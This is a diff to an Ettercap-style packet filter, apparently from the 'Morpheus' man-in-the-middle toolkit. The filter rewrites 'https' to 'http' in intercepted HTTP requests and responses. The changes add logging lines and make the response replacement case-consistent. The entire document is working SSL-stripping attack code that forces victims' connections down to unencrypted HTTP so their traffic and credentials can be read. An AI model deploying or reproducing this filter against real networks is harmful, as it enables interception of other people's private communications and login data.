@@ -34,26 +34,27 @@ if (ip.proto == TCP && tcp.dst == 80) {
 ##
 # Requests
 if (ip.proto == TCP && tcp.dst == 80) {
+  msg("[Morpheus Filter] HTTP request seen.");
    if (search(DECODED.data, "https")){
       replace("https", "http"); 
-      msg("[Morpheus Filter] https zapped from request.\n");
+      msg("[Morpheus Filter] https zapped from request!\n");
    }
    if (search(DATA.data, "HTTPS")){
       replace("HTTPS", "HTTP");
-      msg("[Morpheus Filter] HTTPS zapped from request.\n"); 
+      msg("[Morpheus Filter] HTTPS zapped from request!\n"); 
    }
 }
 
 ##
 # Response
 if (ip.proto == TCP && tcp.src == 80) {
-  # msg("[HTTP Response Filter] HTTP response seen.\n");
+  msg("[Morpheus Filter] HTTP response seen.");
    if (search(DECODED.data, "https")){
       replace("https", "http"); 
       msg("[HTTP Response Filter] *** HTTPS ZAPPED from response\n");
    }
-   if (search(DATA.data, "https")){
-      replace("https", "http"); 
+   if (search(DATA.data, "HTTPS")){
+      replace("HTTPS", "HTTP"); 
       msg("[HTTP Response Filter] *** HTTPS ZAPPED from response\n");
    }
 }
